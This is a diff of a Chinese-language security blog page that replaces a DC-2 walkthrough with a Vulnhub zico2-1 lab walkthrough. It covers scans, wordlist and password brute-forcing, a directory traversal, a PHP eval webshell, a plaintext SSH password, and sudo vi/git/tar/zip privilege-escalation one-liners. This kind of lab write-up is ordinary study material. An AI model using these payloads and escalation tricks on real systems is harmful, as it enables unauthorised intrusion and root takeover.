@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-2 | G00d`s Blog</title>
+<title>Vulnhub-28.zico2-1 | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-2</h1>
+            <h1 class="post-title">Vulnhub-28.zico2-1</h1>
             
                 <div class="post-meta">
                     
@@ -399,7 +399,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:12</a>
+                        Date: <a href="#">十二月 8, 2024&nbsp;&nbsp;11:16:40</a>
                         </span>
                     
                     
@@ -415,66 +415,29 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点:"></a>外围打点:</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集:"></a>信息收集:</h3><p>Nmap -sn -T4 192.168.213.0&#x2F;24 扫描整个网段,也可以查询arp地址</p>
-<p>Arp-scan -l 回显ip地址和mac地址,需要root权限</p>
-<p><img src="/dc-2//1.png" alt="1"></p>
-<p>容易知道dc-2的ip就是192.168.213.153</p>
-<p>查询开放端口信息</p>
-<p>Nmap -A -sV 192.168.213.153</p>
-<p><img src="/dc-2//2.png" alt="2"></p>
-<p>用不同参数扫描一下 nmap -A -p- 192.168.213.153</p>
-<p><img src="/dc-2//3.png" alt="3">这里更详细</p>
-<p>发现这台主机开放了80和7744端口，80是http，7744是ssh服务。</p>
-<p>有重定向:访问一个网站时，计算机首先会检查我们的本地hosts文件，那我们直接修改一下hosts文件就好了呀</p>
-<p><img src="/dc-2//4.png" alt="4"></p>
-<p>然后直接访问dc-2&#x2F; 能看到flag1</p>
-<p><img src="/dc-2//5.png" alt="5"></p>
-<p>提示我们要用cewl字典,并且登录就能看到下一个提示</p>
-<p>目录扫描</p>
-<p>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a></p>
-<p><img src="/dc-2//6.png" alt="6"></p>
-<p>找到登录页面</p>
-<p><img src="/dc-2//7.png" alt="7"></p>
-<p>用cewl:</p>
-<p>Cewl -h查看帮助</p>
-<p>Cewl <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a>index.php&#x2F;flag&#x2F; -w dict.txt</p>
-<p><img src="/dc-2//8.png" alt="8"></p>
-<p>这是通过爬取网站关键信息生成了一个字典,放在了dict.txt里面</p>
-<p>接着认识一款新工具,wpscan是针对wordpress的漏扫工具</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> –enumerate u</p>
-<p><img src="/dc-2//9.png" alt="9"></p>
-<p>得到3个账户名,把账户名存起来</p>
-<p>Echo -e “admin\njerry\ntom\n” &gt; user.txt</p>
-<p>wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> -U users.txt -P dict.txt</p>
-<p><img src="/dc-2//10.png" alt="10"></p>
-<p>没有得到admin的密码,不过可以拿到flag2了,</p>
-<p>找了半天终于找到flag2了</p>
-<p><img src="/dc-2//11.png" alt="11"></p>
-<p>想到xss,但是似乎不能拿到shell</p>
-<p>再去看我们收集到的资产,有个ssh,尝试用这两个账号登录一下</p>
-<p>Ssh <a href="mailto:&#x74;&#x6f;&#109;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#49;&#x33;&#x2e;&#49;&#53;&#x33;">&#x74;&#x6f;&#109;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#50;&#49;&#x33;&#x2e;&#49;&#53;&#x33;</a> -P 7744</p>
-<p><img src="/dc-2//12.png" alt="12"></p>
-<p><img src="/dc-2//13.png" alt="13"></p>
-<p>tom能登上,tom把网站密码和服务器密码设置的一样,拿到flag3</p>
-<p><img src="/dc-2//14.png" alt="14"></p>
-<p>提示tom的权限被限制了</p>
-<h2 id="那么可以用vi提权"><a href="#那么可以用vi提权" class="headerlink" title="那么可以用vi提权"></a>那么可以用vi提权</h2><p>vi test</p>
-<p>set shell&#x3D;&#x2F;bin&#x2F;sh</p>
-<p>shell</p>
-<p>现在就有shell的权限了</p>
-<p>用export -p发现tom的命令很少</p>
-<p><img src="/dc-2//15.png" alt="15"></p>
-<p>更换shell路径</p>
-<p>export PATH&#x3D;”&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;rbin:&#x2F;bin”</p>
-<p>然后su jerry</p>
-<p><img src="/dc-2//16.png" alt="16"></p>
-<p>感觉是要提权看root目录</p>
-<p>Sudo -l</p>
-<p><img src="/dc-2//17.png" alt="17"></p>
-<p>只有git方法能够不输入密码sudo</p>
-<h2 id="这里学一个git提权"><a href="#这里学一个git提权" class="headerlink" title="这里学一个git提权"></a>这里学一个git提权</h2><p>sudo git help config</p>
-<p>!&#x2F;bin&#x2F;bash</p>
-<p><img src="/dc-2//image18.png"></p>
+            <h1 id="zico2-1"><a href="#zico2-1" class="headerlink" title="zico2-1"></a>zico2-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.240.135</span>     nmap --min-rate <span class="number">100000</span> -p80,<span class="number">22</span>,<span class="number">111</span>,<span class="number">54453</span> -A <span class="number">192.168.240.135</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.240.135</span>   dirb  http://<span class="number">192.168.240.135</span>/      nikto -host <span class="number">192.168.240.135</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|  <span class="number"> 1024 </span>68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)</span><br><span class="line">|  <span class="number"> 2048 </span>50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)</span><br><span class="line">|_ <span class="number"> 256 </span>11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-title: Zico&#x27;s Shop</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|  <span class="number"> 100000 </span> 2,3,4        111/tcp   rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 2,3,4        111/udp   rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 3,4          111/tcp6  rpcbind</span><br><span class="line">|  <span class="number"> 100000 </span> 3,4          111/udp6  rpcbind</span><br><span class="line">|  <span class="number"> 100024 </span><span class="number"> 1 </span>         40322/udp6  status</span><br><span class="line">|  <span class="number"> 100024 </span><span class="number"> 1 </span>         48314/udp   status</span><br><span class="line">|  <span class="number"> 100024 </span><span class="number"> 1 </span>         50709/tcp6  status</span><br><span class="line">|_ <span class="number"> 100024 </span><span class="number"> 1 </span>         54453/tcp   status</span><br><span class="line">54453/tcp open  status <span class="number"> 1 </span>(RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:BC:84:19 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least<span class="number"> 1 </span>open and<span class="number"> 1 </span>closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.5</span><br><span class="line">Network Distance:<span class="number"> 1 </span>hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.240.135</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done:<span class="number"> 1 </span>IP address (1 host up) scanned in 13.28 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入<span class="number">80</span>端口,一直点点点,http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span>/view.php?page=tools.html</span><br><span class="line">发现这个page有目录穿越漏洞,但是现在还不知道绝对路径是什么</span><br><span class="line">尝试了几次找到了http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span><span class="regexp">/view.php?page=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/var/</span>www/tools.html</span><br><span class="line">这个在实战能交一个中危</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-28-zico2-1//image-20241208135640370.png" alt="image-20241208135640370"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb扫到了这个目录---- Entering directory: http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span><span class="regexp">/dbadmin/</span> ---</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span><span class="regexp">/dbadmin/</span>test_db.php这是sqlite的网页版,也没有验证码直接爆破拿到密码是admin</span><br><span class="line">这个数据库有远程执行漏洞,大概就是说上传一个反弹webshell就ok了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-28-zico2-1//image-20241208140558214.png" alt="image-20241208140558214"></p>
+<p><img src="/vulnhub-28-zico2-1//image-20241208140737953.png" alt="image-20241208140737953"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-28-zico2-1//image-20241208172436157.png" alt="image-20241208172436157"><img src="/vulnhub-28-zico2-1//image-20241208172514138.png" alt="image-20241208172514138"><img src="/vulnhub-28-zico2-1//image-20241208172652595.png" alt="image-20241208172652595"><img src="/vulnhub-28-zico2-1//image-20241208172713636.png" alt="image-20241208172713636"><img src="/vulnhub-28-zico2-1//image-20241208172749045.png" alt="image-20241208172749045"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">改一下名字就能在http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span><span class="regexp">/dbadmin/</span>这里看到了</span><br><span class="line">用蚁剑连webshell http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">240.135</span><span class="regexp">/dbadmin/</span>test.php  </span><br><span class="line">插件直接把shell给到msf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-28-zico2-1//image-20241208175857552.png" alt="image-20241208175857552"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/vulnhub-28-zico2-1//image-20241208180243541.png" alt="image-20241208180243541"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先找<span class="built_in">config</span>文件，找到了一个账号一个用户名</span><br><span class="line">ssh zico@<span class="number">192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">135</span> <span class="keyword">sWfCsfJSPV9H3AmQzw8 </span>登录即可</span><br><span class="line">sudo -l 发现tar和zip有root权限，真奇怪，谁一般给压缩命令root权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-28-zico2-1//image-20241208190147508.png" alt="image-20241208190147508"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过tar提权：</span><br><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">sudo tar <span class="keyword">cf</span> archive.tar * --checkpoint=1 --checkpoint-action=exec=<span class="keyword">sh</span> <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">通过<span class="keyword">zip</span>提权</span><br><span class="line">touch 1.txt</span><br><span class="line">sudo <span class="keyword">zip</span> 1.<span class="keyword">zip</span> 1.txt -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
 
         </div>
 
@@ -511,10 +474,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-3/">DC-3</a>
+                <a class="prev" rel="prev" href="../vulnhub-29-webdeveloper-1/">Vulnhub-29.WebDeveloper-1</a>
             
             
-            <a class="next" rel="next" href="../dc-1/">DC-1</a>
+            <a class="next" rel="next" href="../misc-kex%E4%B8%8D%E8%83%BD%E7%94%A8root%E6%89%93%E5%BC%80/">Misc-kex不能用root打开</a>
             
         </section>
 
